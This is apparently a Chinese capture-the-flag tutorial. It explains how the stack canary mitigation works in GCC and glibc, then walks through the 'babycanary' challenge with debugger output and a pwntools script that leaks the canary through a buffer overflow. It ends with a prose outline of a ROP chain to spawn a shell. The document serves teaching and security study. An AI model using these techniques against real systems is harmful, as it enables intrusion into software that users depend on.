# 从BabyCanary入门Canary

**Canary**直译就是金丝雀，为什么是叫金丝雀

17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离

由于 **stack overflow** 而引发的攻击非常普遍也非常古老, 相应地一种叫做 **canary** 的 **mitigation** 技术很早就出现在 **glibc** 里, 直到现在也作为系统安全的第一道防线存在。

**Canary** 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 **stack overflow** 发生的 高危区域的尾部, 当函数返回之时检测 **canary** 的值是否经过了改变, 以此来判断 **stack/buffer overflow** 是否发生.

**Canary** 与 **windows** 下的 **GS** 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 **linux** 下保护机制的标配

## Canary 原理

### 在 GCC 中使用 Canary

可以在 **GCC** 中使用以下参数设置 **Canary**:

```
-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护
-fstack-protector-all 启用保护，为所有函数插入保护
-fstack-protector-strong
-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护
-fno-stack-protector 禁用保护.
```

### Canary 实现原理 

开启 **Canary** 保护的 **stack** 结构大概如下

```
        High
        Address |                 |
                +-----------------+
                | args            |
                +-----------------+
                | return address  |
                +-----------------+
        rbp =>  | old ebp         |
                +-----------------+
      rbp-8 =>  | canary value    |
                +-----------------+
                | 局部变量        |
        Low     |                 |
        Address
```

当程序启用 **Canary** 编译后，在函数序言部分会取 **fs** 寄存器 **0x28** 处的值，存放在栈中 **%ebp-0x8** 的位置。 这个操作即为向栈中插入 **Canary** 值，代码如下：

```
mov    rax, qword ptr fs:[0x28]
mov    qword ptr [rbp - 8], rax
```

在函数返回之前，会将该值取出，并与 **fs:0x28** 的值进行异或。如果异或的结果为 **0**，说明 **canary** 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。

```
mov    rdx,QWORD PTR [rbp-0x8]
xor    rdx,QWORD PTR fs:0x28
je     0x4005d7 <main+65>
call   0x400460 <__stack_chk_fail@plt>
```

如果 **canary** 已经被非法修改，此时程序流程会走到 `__stack_chk_fail`。`__stack_chk_fail` 也是位于 **glibc** 中的函数，默认情况下经过 **ELF** 的延迟绑定，定义如下。

```c
eglibc-2.19/debug/stack_chk_fail.c

void __attribute__ ((noreturn)) __stack_chk_fail (void)
{
  __fortify_fail ("stack smashing detected");
}

void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)
{
  /* The loop is added only to keep gcc happy.  */
  while (1)
    __libc_message (2, "*** %s ***: %s terminated\n",
                    msg, __libc_argv[0] ?: "<unknown>");
}
```

这意味可以通过劫持 `__stack_chk_fail`的 **go**t 值劫持流程或者利用 `__stack_chk_fail` 泄漏内容

进一步，对于 **Linux** 来说，**fs** 寄存器实际指向的是当前栈的 **TLS** 结构，**fs:0x28** 指向的正是 **stack_guard**。

```c
typedef struct
{
  void *tcb;        /* Pointer to the TCB.  Not necessarily the
                       thread descriptor used by libpthread.  */
  dtv_t *dtv;
  void *self;       /* Pointer to the thread descriptor.  */
  int multiple_threads;
  uintptr_t sysinfo;
  uintptr_t stack_guard;
  ...
} tcbhead_t;
```

如果存在溢出可以覆盖位于 **TLS** 中保存的 **Canary** 值那么就可以实现绕过保护机制。

事实上，**TLS** 中的值由函数 **security_init** 进行初始化。

```c
static void
security_init (void)
{
  // _dl_random的值在进入这个函数的时候就已经由kernel写入.
  // glibc直接使用了_dl_random的值并没有给赋值
  // 如果不采用这种模式, glibc也可以自己产生随机数

  //将_dl_random的最后一个字节设置为0x0
  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);

  // 设置Canary的值到TLS中
  THREAD_SET_STACK_GUARD (stack_chk_guard);

  _dl_random = NULL;
}

//THREAD_SET_STACK_GUARD宏用于设置TLS
#define THREAD_SET_STACK_GUARD(value) \
  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)
```

总的来说检测的机制是这样的：

1.程序从一个神奇的地方取出一个4（**eax**，32位系统）或8（**rax**，64位系统）节的值，在32位程序上，你可能会看到

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1122569b3258873874d61fd5bfc62fba.png)

在64位上，你可能会看到

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1d676e1ed18ade8675f112f61e39ab74.png)

放到栈上以后，**eax**中的副本也会被清空（**xor eax,eax**）

2.程序正常的走完了流程，到函数执行完的时候，程序会再次从那个神奇的地方把**canary**的值取出来，和之前放在栈上的**canary**进行比较，如果因为栈溢出什么的原因覆盖到了**canary**而导致**canary**发生了变化则直接终止程序

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_1acfdb1810a2876c78383f4a3a66a515.png)

![](https://github-1251836300.cos.ap-guangzhou.myqcloud.com/%E4%BB%8EBabyCanary%E5%85%A5%E9%97%A8Canary/canary_b151b13af2155fff6a842855cbbd4d07.png)

## BabyCanary

我们先检查一下程序情况

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以得知开启了**Canary**防护和**NX**防护

**main**函数

```c
__int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  sub_4006F9();
  return 0LL;
}
```

**sub_4006F9**函数

```c
unsigned __int64 sub_4006F9()
{
  char buf; // [rsp+0h] [rbp-90h]
  unsigned __int64 v2; // [rsp+88h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("tell me your name:");
  read(0, &buf, 0x100uLL);
  printf("OK,%s,let start!\n", &buf);
  sub_400696();
  return __readfsqword(0x28u) ^ v2;
}
```

**sub_4006F9**函数中使用**read**函数获取输入，然后使用**printf**函数直接输出，存在格式化字符串漏洞，可以泄露内存

大体思路就是通过格式化字符串读取**canary**的值，然后在栈溢出的**padding**块把**canary**所在位置的值用正确的**canary**替换，从而绕过**canary**的检测

观察得到Canary的生成代码

```c
.text:00000000004006F9                 push    rbp
.text:00000000004006FA                 mov     rbp, rsp
.text:00000000004006FD                 sub     rsp, 90h
.text:0000000000400704 ; 5:   v2 = __readfsqword(0x28u);
.text:0000000000400704                 mov     rax, fs:28h
.text:000000000040070D                 mov     [rbp+var_8], rax
.text:0000000000400711 ; 6:   puts("tell me your name:");
.text:0000000000400711                 xor     eax, eax
```

我们使用**GDB**调试，先下一个断点到**0x00000000004006F9**，查看一下汇编情况

```
 ► 0x4006f9    push   rbp
   0x4006fa    mov    rbp, rsp
   0x4006fd    sub    rsp, 0x90
   0x400704    mov    rax, qword ptr fs:[0x28]
   0x40070d    mov    qword ptr [rbp - 8], rax
   0x400711    xor    eax, eax
   0x400713    mov    edi, 0x400824
   0x400718    call   0x400560
   0x40071d    lea    rax, [rbp - 0x90]
   0x400724    mov    edx, 0x100
   0x400729    mov    rsi, rax
```

一直单步运行直至异或eax寄存器

```
   0x4006f9    push   rbp
   0x4006fa    mov    rbp, rsp
   0x4006fd    sub    rsp, 0x90
   0x400704    mov    rax, qword ptr fs:[0x28]
   0x40070d    mov    qword ptr [rbp - 8], rax
 ► 0x400711    xor    eax, eax
   0x400713    mov    edi, 0x400824
   0x400718    call   0x400560
   0x40071d    lea    rax, [rbp - 0x90]
   0x400724    mov    edx, 0x100
   0x400729    mov    rsi, rax
```

查看此时栈上的情况

```
pwndbg> x/20gx $rbp
0x7fffffffde40:	0x00007fffffffde50	0x000000000040077e
0x7fffffffde50:	0x0000000000400790	0x00007ffff7a2d830
0x7fffffffde60:	0x00007fffffffdf38	0x00007fffffffdf38
0x7fffffffde70:	0x00000001f7b99608	0x0000000000400770
0x7fffffffde80:	0x0000000000000000	0x5dbdf3d3bbac9a43
0x7fffffffde90:	0x00000000004005a0	0x00007fffffffdf30
0x7fffffffdea0:	0x0000000000000000	0x0000000000000000
0x7fffffffdeb0:	0xa2420cac084c9a43	0xa2421c161b5c9a43
0x7fffffffdec0:	0x0000000000000000	0x0000000000000000
0x7fffffffded0:	0x0000000000000000	0x00007fffffffdf48
```

得知canary的值在`[rbp - 8]`处，则我们直接查看这里的值

```
pwndbg> telescope $rbp-8
00:0000│      0x7fffffffde38 ◂— 0xca64b11c5d706100
01:0008│ rbp  0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15
02:0010│      0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0
03:0018│      0x7fffffffde50 —▸ 0x400790 ◂— push   r15
04:0020│      0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
05:0028│      0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— '/home/syc/Documents/challange/babycanary/babycanary'
... ↓
07:0038│      0x7fffffffde70 ◂— 0x1f7b99608
```

可以得知**Canary**的值就是 **0xca64b11c5d706100**

但是问题是我们发现这题其实并不能使用格式化字符串实现泄露**Canary**的地址，因为它使用的是**Read**函数，并不会在后面添加**“0/”**截断，无法被解析也就无法利用格式化字符串漏洞。我们只能使用栈溢出直接输出**Canary**函数

我们先构造一个长度为**90**的字符串先尝试一下，下一个断点在**0x0000000000400736**(**printf**函数)

```shell
syc@ubuntu:~/Documents/challange$ python pattern.py create 128
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae
```

然后运行在断点处查看栈结构

```shell
pwndbg> stack 50
00:0000│ rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')
01:0008│          0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')
02:0010│          0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')
03:0018│          0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')
04:0020│          0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')
05:0028│          0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')
06:0030│          0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')
07:0038│          0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')
08:0040│          0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')
09:0048│          0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
0a:0050│          0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')
0b:0058│          0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')
0c:0060│          0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')
0d:0068│          0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')
0e:0070│          0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')
0f:0078│          0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')
10:0080│          0x7fffffffde30 —▸ 0x40070a ◂— add    byte ptr [rax], al
11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100
12:0090│ rbp      0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15
13:0098│          0x7fffffffde48 —▸ 0x40077e ◂— mov    eax, 0
14:00a0│          0x7fffffffde50 —▸ 0x400790 ◂— push   r15
15:00a8│          0x7fffffffde58 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
16:00b0│          0x7fffffffde60 —▸ 0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— '/home/syc/Documents/challange/babycanary/babycanary'
... ↓
18:00c0│          0x7fffffffde70 ◂— 0x1f7b99608
19:00c8│          0x7fffffffde78 —▸ 0x400770 ◂— push   rbp
1a:00d0│          0x7fffffffde80 ◂— 0x0
1b:00d8│          0x7fffffffde88 ◂— 0x4b03463a62f1fbbf
1c:00e0│          0x7fffffffde90 —▸ 0x4005a0 ◂— xor    ebp, ebp
1d:00e8│          0x7fffffffde98 —▸ 0x7fffffffdf30 ◂— 0x1
1e:00f0│          0x7fffffffdea0 ◂— 0x0
... ↓
20:0100│          0x7fffffffdeb0 ◂— 0xb4fcb945d111fbbf
21:0108│          0x7fffffffdeb8 ◂— 0xb4fca9ffc201fbbf
22:0110│          0x7fffffffdec0 ◂— 0x0
... ↓
25:0128│          0x7fffffffded8 —▸ 0x7fffffffdf48 —▸ 0x7fffffffe2dd ◂— 'XDG_VTNR=7'
26:0130│          0x7fffffffdee0 —▸ 0x7ffff7ffe168 ◂— 0x0
27:0138│          0x7fffffffdee8 —▸ 0x7ffff7de77db (_dl_init+139) ◂— jmp    0x7ffff7de77b0
28:0140│          0x7fffffffdef0 ◂— 0x0
... ↓
2a:0150│          0x7fffffffdf00 —▸ 0x4005a0 ◂— xor    ebp, ebp
2b:0158│          0x7fffffffdf08 —▸ 0x7fffffffdf30 ◂— 0x1
2c:0160│          0x7fffffffdf10 ◂— 0x0
2d:0168│          0x7fffffffdf18 —▸ 0x4005c9 ◂— hlt    
2e:0170│          0x7fffffffdf20 —▸ 0x7fffffffdf28 ◂— 0x1c
2f:0178│          0x7fffffffdf28 ◂— 0x1c
30:0180│ r13      0x7fffffffdf30 ◂— 0x1
31:0188│          0x7fffffffdf38 —▸ 0x7fffffffe2a9 ◂— 
```

从`11:0088│          0x7fffffffde38 ◂— 0x8b5843fb32c04100`可以知道这就是**Canary**的值，那我们还需要增加字符串长度，正好溢出到canary的位置，则根据计算**hex(30-28=8)**,则需要生成**136**个字符

```shell
syc@ubuntu:~/Documents/challange$ python pattern.py create 136
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4A
```

```shell
pwndbg> stack 50
00:0000│ rax rsi rsp  0x7fffffffddb0 ◂— 0x6141316141306141 ('Aa0Aa1Aa')
01:0008│              0x7fffffffddb8 ◂— 0x4134614133614132 ('2Aa3Aa4A')
02:0010│              0x7fffffffddc0 ◂— 0x3761413661413561 ('a5Aa6Aa7')
03:0018│              0x7fffffffddc8 ◂— 0x6241396141386141 ('Aa8Aa9Ab')
04:0020│              0x7fffffffddd0 ◂— 0x4132624131624130 ('0Ab1Ab2A')
05:0028│              0x7fffffffddd8 ◂— 0x3562413462413362 ('b3Ab4Ab5')
06:0030│              0x7fffffffdde0 ◂— 0x6241376241366241 ('Ab6Ab7Ab')
07:0038│              0x7fffffffdde8 ◂— 0x4130634139624138 ('8Ab9Ac0A')
08:0040│              0x7fffffffddf0 ◂— 0x3363413263413163 ('c1Ac2Ac3')
09:0048│              0x7fffffffddf8 ◂— 0x6341356341346341 ('Ac4Ac5Ac')
0a:0050│              0x7fffffffde00 ◂— 0x4138634137634136 ('6Ac7Ac8A')
0b:0058│              0x7fffffffde08 ◂— 0x3164413064413963 ('c9Ad0Ad1')
0c:0060│              0x7fffffffde10 ◂— 0x6441336441326441 ('Ad2Ad3Ad')
0d:0068│              0x7fffffffde18 ◂— 0x4136644135644134 ('4Ad5Ad6A')
0e:0070│              0x7fffffffde20 ◂— 0x3964413864413764 ('d7Ad8Ad9')
0f:0078│              0x7fffffffde28 ◂— 0x6541316541306541 ('Ae0Ae1Ae')
10:0080│              0x7fffffffde30 ◂— 0x4134654133654132 ('2Ae3Ae4A')
11:0088│              0x7fffffffde38 ◂— 0xfb83dc38787b3d0a
12:0090│ rbp          0x7fffffffde40 —▸ 0x7fffffffde50 —▸ 0x400790 ◂— push   r15
```

可以看到Canary的值就是**0xfb83dc38787b3d0a**

这样子我们可以写一个脚本来暴露Canary的值了

```python
#coding:utf-8
from pwn import *
r = process("./babycanary")
gdb.attach(r,"b *0x400736")
payload = "a"*136
r.sendlineafter("tell me your name:\n",payload)
r.recvuntil('OK,'+ "a"*136)
canary = u64(r.recv(8))
print "canary :" + hex(canary)
```

运行后可以得到Canary的值为：**0xbc2b48de6267a90a**

```shell
[DEBUG] Received 0xa5 bytes:
    00000000  4f 4b 2c 61  61 61 61 61  61 61 61 61  61 61 61 61  │OK,a│aaaa│aaaa│aaaa│
    00000010  61 61 61 61  61 61 61 61  61 61 61 61  61 61 61 61  │aaaa│aaaa│aaaa│aaaa│
    *
    00000080  61 61 61 61  61 61 61 61  61 61 61 0a  a9 67 62 de  │aaaa│aaaa│aaa·│·gb·│
    00000090  48 2b bc 70  cc 8b ca ff  7f 2c 6c 65  74 20 73 74  │H+·p│····│·,le│t st│
    000000a0  61 72 74 21  0a                                     │art!│·│
    000000a5
canary :0xbc2b48de6267a90a
```

通过GDB调试可以查看

```shell
pwndbg> stack 50
00:0000│ rax rsi rsp  0x7fffca8bcbd0 ◂— 0x6161616161616161 ('aaaaaaaa')
... ↓
11:0088│              0x7fffca8bcc58 ◂— 0xbc2b48de6267a90a
12:0090│ rbp          0x7fffca8bcc60 —▸ 0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15
13:0098│              0x7fffca8bcc68 —▸ 0x40077e ◂— mov    eax, 0
14:00a0│              0x7fffca8bcc70 —▸ 0x400790 ◂— push   r15
15:00a8│              0x7fffca8bcc78 —▸ 0x7fd06a5f1830 (__libc_start_main+240)
```

我们的脚本是正确的，我们已经获取了绕过Canary，接下来就是普通的栈溢出题目了

可以覆盖返回地址为**pop pop pop pop ret**指令地址，返回时弹出**0x18**个填充字节和返回地址,返回到**buf+0x20**处，就避开了栈不可执行

在**buf+0x20**处构造**ROP**，通过write函数，先泄露**libc**基地址，返回到**start**

重新执行，输入使之执行**system('/bin/sh')**

需要用到的信息，包括**bss**段的地址、**main**函数地址、程序中已有函数的地址、**gadgets**地址